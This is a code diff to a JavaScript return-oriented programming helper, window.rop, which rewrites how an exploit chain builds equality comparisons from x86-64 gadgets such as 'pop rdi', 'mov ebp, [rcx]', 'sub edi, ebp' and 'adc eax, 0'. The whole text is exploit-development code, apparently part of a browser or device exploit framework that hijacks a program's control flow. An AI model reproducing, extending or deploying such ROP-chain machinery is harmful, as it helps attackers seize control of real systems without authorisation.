@@ -146,23 +146,21 @@ window.rop = function () {
     var equality_addr_spc = this.equality_rsps.add32(this.equality_count * 0x10);
     this.equality_count++;
 
-    this.push(window.gadgets["pop rdi"]);
-    this.push(value_addr);
-    this.push(window.gadgets["mov esi, [rdi]"]);
-    this.push(window.gadgets["mov edx, esi"]);
-    this.push(window.gadgets["pop rcx"]);
-    this.push(compare_value);
-    this.push(window.gadgets["cmp edx, ecx"]);
+
     this.push(window.gadgets["pop rax"]);
     this.push(0);
-    this.push(window.gadgets["adc eax, 0"]);
-    this.push(window.gadgets["pop rsi"]);
-    this.push(this.useless_buffer);
-    this.push(window.gadgets["mov rcx, rdx; mov [rsi], rcx"]);
-    this.push(window.gadgets["pop rdx"]);
+    this.push(window.gadgets["pop rcx"]);
+    this.push(value_addr);
+    this.push(window.gadgets["mov ebp, [rcx]"]);
+    this.push(window.gadgets["pop rdi"]);
     this.push(compare_value);
-    this.push(window.gadgets["cmp edx, ecx"]);
+    this.push(window.gadgets["sub edi, ebp"]);
     this.push(window.gadgets["adc eax, 0"]);
+    this.push(window.gadgets["pop rdi"]);
+    this.push(compare_value);
+    this.push(window.gadgets["sub ebp, edi"]);
+    this.push(window.gadgets["adc eax, 0"]);
+    
     this.push(window.gadgets["pop rcx"]);
     this.push(8);
     this.push(window.gadgets["imul rax, rcx"]);
@@ -182,16 +180,16 @@ window.rop = function () {
     var equality_addr_spc = this.equality_rsps.add32(this.equality_count * 0x10);
     this.equality_count++;
 
-    this.push(window.gadgets["pop rdi"]);
-    this.push(value_addr);
-    this.push(window.gadgets["mov esi, [rdi]"]);
-    this.push(window.gadgets["mov edx, esi"]);
-    this.push(window.gadgets["pop rcx"]);
-    this.push(compare_value);
-    this.push(window.gadgets["cmp edx, ecx"]);
     this.push(window.gadgets["pop rax"]);
     this.push(0);
+    this.push(window.gadgets["pop rdi"]);
+    this.push(value_addr);
+    this.push(window.gadgets["mov ebp, [rdi]"]);
+    this.push(window.gadgets["pop rdi"]);
+    this.push(compare_value);
+    this.push(window.gadgets["sub ebp, edi"]);
     this.push(window.gadgets["adc eax, 0"]);
+
     this.push(window.gadgets["pop rcx"]);
     this.push(8);
     this.push(window.gadgets["imul rax, rcx"]);
